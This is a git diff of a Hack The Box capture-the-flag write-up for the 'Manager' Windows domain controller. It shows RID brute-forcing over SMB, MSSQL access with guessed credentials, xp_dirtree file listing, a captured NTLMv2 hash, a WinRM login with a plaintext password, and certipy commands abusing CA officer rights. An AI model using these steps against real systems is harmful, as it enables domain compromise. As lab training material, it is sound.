@@ -1,12 +1,12 @@
 # HTB - Manager
 
 ### TL;DR
-
-
+This is a Windows 2019 server machine configured as domain controller with a running mssql database. Using enabled guest sessions on smb shared, we can bruteforce the rid and get a list of domain users which allows us to bruteforce credentials for the mssql database. In the database, xp_dirtree is used to locate a backup of the database which contains credentials for winrm. For privesc, a misconfiguration on the manage CA permissions can be abused to create a new certificate for an administrator user.
 **Keywords:**
-
+rid bruteforce, mssql directory traversal with `xp_dirtree`, manageCA, pass the certificate, pass the ticket.
 **References:**
-
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
+https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate
 ### PHASE 1. Service enumeration
 Launch a port scan with `nmap`
 ```markdown
@@ -106,7 +106,7 @@ Nmap done: 1 IP address (1 host up) scanned in 55.72 seconds
 ```
 SMB enumeration.
 ```markdown
-smbmap -H <target ip> -u guest
+> smbmap -H <target ip> -u guest
 [+] IP: 10.129.142.151:445      Name: manager.htb
   Disk                          Permissions     Comment
   ----                          -----------     -------
@@ -156,6 +156,7 @@ SMB         10.129.142.151  445    DC01             1116: MANAGER\Raven (SidType
 SMB         10.129.142.151  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
 SMB         10.129.142.151  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
 SMB         10.129.142.151  445    DC01             1119: MANAGER\Operator (SidTypeUser)
+```
 
 ![manager1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f1f2c56e-9f75-4173-911c-a20431b38b86)
 
@@ -191,7 +192,7 @@ Attack is successful for credentials `operator:operator`
 
 ![manager3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/24859b0f-2727-49d4-a063-cc318dade2ef)
 
-Login with credentials and start enumerating the database.
+Log in with credentials and start enumerating the database.
 ```markdown
 > python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py manager.htb/operator:operator@10.129.142.151 -windows-auth
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -204,8 +205,8 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
 [!] Press help for extra shell commands
-> SQL> help
 
+> SQL> help
      lcd {path}                 - changes the current local directory to {path}
      exit                       - terminates the server process (and this session)
      enable_xp_cmdshell         - you know what it means
@@ -220,12 +221,12 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
 [-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
 ```
-So `xp_cmdshell` is not enabled and we don't have permissions to activate so this way is closed. We can also try to cmpture the ntlmv2 hash with `responder` or `smbserver.py` + `xp_dirtree`
+It seems `xp_cmdshell` is not enabled and we don't have permissions to activate, therefore this way is closed. We can try to cmpture the NTLMv2 hash with `responder` or `smbserver.py` + `xp_dirtree`
 The captured hash is.
 ```markdown
 [*] DC01$::MANAGER:aaaaaaaaaaaaaaaa:d063ef67f8a1adf0d8368e4438f744db:0101000000000000809a7d8dbd04da01a9e4c3054b7505c100000000010010004200470051006400540074006800640003001000420047005100640054007400680064000200100050005a005800780059005600670041000400100050005a0058007800590056006700410007000800809a7d8dbd04da0106000400020000000800300030000000000000000000000000300000489aaa814b1c641c0613cb01649cab0b0c5aadd6d67823781f76634d0d773dec0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360039000000000000000000
 ```
-Not crackable with hashcat though.
+It is not crackable with hashcat though.
 Since we can at least explore the file system with `xp_dirtree`, let's list the contents of `webroot` folder.
 ```markdown
 > SQL> exec xp_dirtree 'c:\inetpub',1,1
@@ -251,22 +252,20 @@ js                                                                            1 
 service.html                                                                  1             1   
 web.config                                                                    1             1   
 website-backup-27-07-23-old.zip                                               1             1   
-``
-Ìt seems someone made a backup of the site on july and forgot a copy of the file in the webroot folder. This can be downloaded using a browser or wget.
-```markdown
-wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip
 ```
-Opening the `.zip` file, we find a `.xml` with credentials.
+Ìt seems someone made a backup of the site on july and forgot a copy of the file in the `webroot` folder. This can be downloaded using a browser or `wget`
+```markdown
+> wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip
+```
+Opening the `.zip` file, we find an `.xml` with credentials.
 
 ![manager4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/fa59df58-80fd-45a8-b36d-4c1ab9174d5d)
 
-We use them to log in with evil-winrm.
+We use them to log in with `evil-winrm`
 ```markdown
 evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123'  -i 10.129.142.151
 ```
 This shell allows us to collect `user.txt`
-<br>
-<br>
 ### PHASE 3. System
 First step is to upgrade the shell to a nishang interactive shell.
 ```markdown
@@ -284,7 +283,7 @@ Enumerate principal rights with `certify.exe`
 
 ![manager5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/07a54637-4a5a-4ac5-adbf-0cbfcdc83654)
 
-It seems user raven has privileges to manageCA. A walkthrough to exploit this vulnerability can be found here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
+It seems user `rave`n` has privileges to manage the CA. A walkthrough to exploit this vulnerability can be found here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
 First step is to grant yourself the Manage Certificates access right by adding your user as a new officer.
 ```markdown
 /usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.142.151 -add-officer raven
